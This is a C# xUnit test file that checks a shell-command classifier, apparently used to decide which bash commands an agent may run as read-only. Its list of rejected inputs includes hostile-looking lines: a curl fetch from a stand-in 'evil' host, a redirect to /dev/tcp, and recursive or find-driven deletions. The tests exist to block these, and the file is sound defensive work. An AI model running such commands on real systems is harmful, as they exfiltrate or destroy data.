using Alcoler.Adapters.Tools;
using Xunit;

namespace Alcoler.Kernel.Tests.Tools;

public class BashSemanticsTests
{
    [Theory]
    [InlineData("git status")]
    [InlineData("git status --short")]
    [InlineData("git --no-pager log --oneline -5")]
    [InlineData("git diff --stat")]
    [InlineData("git diff --cached")]
    [InlineData("git show HEAD")]
    [InlineData("git branch --list")]
    [InlineData("git rev-parse --show-toplevel")]
    [InlineData("git grep needle")]
    [InlineData("git ls-files")]
    [InlineData("git config --get core.autocrlf")]
    [InlineData("GIT_TERMINAL_PROMPT=0 git status")]
    [InlineData("ls -la")]
    [InlineData("cat file.txt")]
    [InlineData("cat -n notes.md")]
    [InlineData("grep -rn pattern .")]
    [InlineData("grep --ignore-case pattern file.txt")]
    [InlineData("rg pattern src")]
    [InlineData("rg --files -g '*.cs'")]
    [InlineData("head -n 20 file.txt")]
    [InlineData("tail -n 5 file.txt")]
    [InlineData("wc -l file.txt")]
    [InlineData("find . -name '*.cs'")]
    [InlineData("find . -maxdepth 2 -type f")]
    [InlineData("pwd")]
    [InlineData("true")]
    [InlineData("which dotnet")]
    [InlineData("cd sub")]
    [InlineData("cd sub && ls")]
    [InlineData("cat a.txt | grep needle")]
    [InlineData("sort names.txt")]
    [InlineData("du -sh .")]
    [InlineData("diff a.txt b.txt")]
    [InlineData("sleep 5")]
    [InlineData("stat file.txt")]
    [InlineData("tree -L 2")]
    public void IsReadOnlyCommand_AcceptsReadonlyHeads(string command)
    {
        Assert.True(BashSemantics.IsReadOnlyCommand(command), command);
    }

    [Theory]
    [InlineData("rm -rf build")]
    [InlineData("npm install")]
    [InlineData("git push")]
    [InlineData("git commit -m 'x'")]
    [InlineData("git -C /elsewhere status")]
    [InlineData("git config user.name")]
    [InlineData("git branch feature-x")]
    [InlineData("git tag v1.0")]
    [InlineData("git reflog expire")]
    [InlineData("echo nope")]
    [InlineData("echo $(whoami)")]
    [InlineData("grep pattern file.txt > out.txt")]
    [InlineData("sed -i 's/a/b/' file.txt")]
    [InlineData("sed --expression='w /tmp/x' file.txt")]
    [InlineData("find . -name '*.tmp' -delete")]
    [InlineData("find . -exec rm {} ;")]
    [InlineData("tree -o tree.txt")]
    [InlineData("FOO=1 ls")]
    [InlineData("cat <(curl http://evil)")]
    [InlineData("curl http://example.com")]
    [InlineData("curl -s url | jq .")]
    [InlineData("cat file | tee copy.txt")]
    [InlineData("mkdir build")]
    [InlineData("ping -n 20 127.0.0.1")]
    [InlineData("echo \"hello $USER\"")]
    [InlineData("rg pattern $(pwd)")]
    [InlineData("cd sub &")]
    [InlineData("ls &")]
    [InlineData("for f in *.txt; do cat $f; done")]
    [InlineData("cat missing.txt || echo fallback")]
    [InlineData("dotnet build")]
    [InlineData("ls > /dev/tcp/host/port")]
    [InlineData("ls //server/share")]
    public void IsReadOnlyCommand_RejectsNonReadonlyOrDynamicInput(string command)
    {
        Assert.False(BashSemantics.IsReadOnlyCommand(command), command);
    }

    [Fact]
    public void Redirects_AllowInputAndDevNullOnly()
    {
        Assert.True(BashSemantics.IsReadOnlyCommand("grep needle < input.txt"));
        Assert.True(BashSemantics.IsReadOnlyCommand("ls > /dev/null"));
        Assert.True(BashSemantics.IsReadOnlyCommand("grep needle file.txt 2>/dev/null"));
        Assert.False(BashSemantics.IsReadOnlyCommand("grep needle file.txt 2> err.txt"));
        Assert.False(BashSemantics.IsReadOnlyCommand("grep needle file.txt >> out.txt"));
    }

    [Fact]
    public void Analyzer_SplitsCompoundCommands()
    {
        var analysis = BashCommandAnalyzer.Analyze("echo a && echo b");
        Assert.True(analysis.IsPermissionSafe);
        Assert.Equal(2, analysis.Commands.Count);
        Assert.Null(analysis.Commands[0].OperatorBefore);
        Assert.Equal("&&", analysis.Commands[1].OperatorBefore);
        Assert.Equal("echo", analysis.Commands[^1].Name);
    }

    [Fact]
    public void Analyzer_PipelinesCarryPipeOperator()
    {
        var analysis = BashCommandAnalyzer.Analyze("cat file.txt | grep needle");
        Assert.Equal(2, analysis.Commands.Count);
        Assert.Equal("|", analysis.Commands[1].OperatorBefore);
        Assert.Equal(["cat", "file.txt"], analysis.Commands[0].Argv);
        Assert.Equal(["grep", "needle"], analysis.Commands[1].Argv);
    }

    [Fact]
    public void Analyzer_StripsQuotesFromArgv()
    {
        var analysis = BashCommandAnalyzer.Analyze("rg 'foo bar' src");
        Assert.Equal(["rg", "foo bar", "src"], analysis.Commands[0].Argv);
    }

    [Fact]
    public void Analyzer_MarksExpansionsAsDynamic()
    {
        Assert.True(BashCommandAnalyzer.Analyze("echo $HOME").HasDynamicWords);
        Assert.True(BashCommandAnalyzer.Analyze("echo \"x $USER\"").HasDynamicWords);
        Assert.True(BashCommandAnalyzer.Analyze("echo `date`").HasDynamicWords);
        Assert.False(BashCommandAnalyzer.Analyze("echo '$HOME'").HasDynamicWords);
        Assert.False(BashCommandAnalyzer.Analyze("echo \\$HOME").HasDynamicWords);
    }

    [Fact]
    public void Analyzer_MarksUnsupportedSyntax()
    {
        Assert.True(BashCommandAnalyzer.Analyze("(cd sub && ls)").HasUnsupportedSyntax);
        Assert.True(BashCommandAnalyzer.Analyze("f() { echo hi; }").HasUnsupportedSyntax);
        Assert.True(BashCommandAnalyzer.Analyze("if true; then ls; fi").HasUnsupportedSyntax);
        Assert.True(BashCommandAnalyzer.Analyze("cat <<EOF\nbody\nEOF").HasUnsupportedSyntax);
    }

    [Fact]
    public void Analyzer_UnbalancedQuotesAreParseErrors()
    {
        Assert.True(BashCommandAnalyzer.Analyze("echo 'unclosed").HasParseErrors);
        Assert.True(BashCommandAnalyzer.Analyze("echo \"unclosed").HasParseErrors);
    }

    [Theory]
    [InlineData("grep needle file.txt", 1, "No matches found")]
    [InlineData("rg needle", 1, "No matches found")]
    [InlineData("egrep needle file.txt", 1, "No matches found")]
    [InlineData("git grep needle", 1, "No matches found")]
    [InlineData("find . -name missing", 1, "Some directories were inaccessible")]
    [InlineData("diff a.txt b.txt", 1, "Files differ")]
    [InlineData("git diff HEAD~1", 1, "Files differ")]
    [InlineData("test -d missing", 1, "Condition is false")]
    [InlineData("[ -d missing ]", 1, "Condition is false")]
    public void SemanticNonErrorExit_MapsKnownCommands(string command, int exitCode, string expected)
    {
        Assert.Equal(expected, BashSemantics.SemanticNonErrorExit(command, exitCode));
        Assert.True(BashSemantics.IsSemanticNonError(expected));
    }

    [Theory]
    [InlineData("exit 3", 3)]
    [InlineData("grep needle file.txt", 2)]
    [InlineData("npm install", 1)]
    [InlineData("grep needle && npm install", 1)]
    [InlineData("echo $(x)", 1)]
    public void SemanticNonErrorExit_ReturnsNullForUnknownCases(string command, int exitCode)
    {
        Assert.Null(BashSemantics.SemanticNonErrorExit(command, exitCode));
    }
}
